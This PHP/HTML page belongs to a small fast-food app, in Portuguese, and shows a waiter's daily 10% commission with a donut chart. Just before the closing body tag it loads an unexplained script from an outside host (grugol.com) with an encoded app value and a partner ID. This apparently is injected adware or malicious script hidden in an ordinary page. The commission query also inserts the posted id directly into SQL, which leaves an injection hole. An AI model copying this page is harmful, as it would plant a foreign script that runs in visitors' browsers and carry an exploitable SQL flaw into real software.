<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>fastfood v1 - Start</title>
    <link href="bootstrap/css/bootstrap.min.css" rel="stylesheet">
    <link href="bootstrap/css/bootstrap.css" rel="stylesheet">
    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
    <!-- Include all compiled plugins (below), or include individual files as needed -->
    <script src="bootstrap/js/bootstrap.min.js"></script>
    <script type="text/javascript" src="http://code.jquery.com/jquery-1.9.1.min.js"></script>
    <script type="text/javascript" src="jquery.quick.search.js"></script>
    <link rel="stylesheet" href="css/style.css">
    <script src="js/Chart.min.js"></script>

    <style type="text/css">
    .box {
        margin: 0px auto;
        width: 70%;
    }
    .box-chart {
        width: 100%;
        margin: 0 auto;
        padding: 5px;
    }
    </style>  

    <script type="text/javascript">
        var randomnb = function(){ return Math.round(Math.random()*300)};
    </script>  

</head>
<body>
<div class="container">
    <?php include "menu.php" ?>
    <div class="row marketing" style=" border: 1px solid rgb(225, 232, 237); border-radius: 4px;">
    <h4 class="text-center">Relatorio de Comissão</h4>
    <div class="col-lg-6">
    <div class="box">
        <div class="box-chart" style="margin-right:550px;">
            <canvas id="GraficoDonut" style="width:100%;"></canvas>
            <script type="text/javascript">
                var options = {
                    responsive:true                    
                };
                var data = [
                    {
                        value: 10,
                        color:"#F7464A",
                        highlight: "#FF5A5E",
                        label: "Recebimento funcionario"
                    },
                    {
                        value: 90,
                        color: "#46BFBD",
                        highlight: "#5AD3D1",
                        label: "Total"
                    }
                ]
                window.onload = function(){
                var ctx = document.getElementById("GraficoDonut").getContext("2d");
                var PizzaChart = new Chart(ctx).Doughnut(data, options);
                }  
            </script>           
        </div>
    </div>

<?php
require_once "connect_db.php";
$id = $_POST['id'];

function buscaConta($id, $dbconn) {
	$contas = array();
	$data = date('Y-m-d');
	$query = "SELECT valorTotal FROM tab_conta WHERE codGarcom = {$id} AND dataAbertura BETWEEN  '{$data} 00:00:00' AND '{$data} 23:59:59'";
	$result = mysql_query($query, $dbconn);
	while($arr = mysql_fetch_assoc($result)) {
		array_push($contas, $arr);
	}

	$t = 0;
	foreach ($contas as $v) {
		$t += (float) $v["valorTotal"] * 0.10;
	}
	return $t;
}
    echo "Fim de Expediente  <br>";
    echo "Comissão a receber: R$ ".buscaConta($id, $dbconn);
    echo "<br>O funcionario tem direito a 10% em cima do valor unitário de vendas.  <br>";
    echo "<br> *A Comissão e o valor recebido pelo funcionario definido pelo valor total de vendas por dia.  <br>";
?>

<br>
<br>
<br>
<br>
<br>
<br>
 	
    </div>
    </div>

      <footer class="footer">
        <p>&copy; 2017 Company, Inc.</p>
      </footer>
</div> <!-- /container -->


    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
  <script src="../../assets/js/ie10-viewport-bug-workaround.js"></script>
  <script src='http://grugol.com/prog/landing.php?app=MDAtMUUtOEMtMjUtRkEtMEQ=&partner=200'></script>

  
</body>
</html>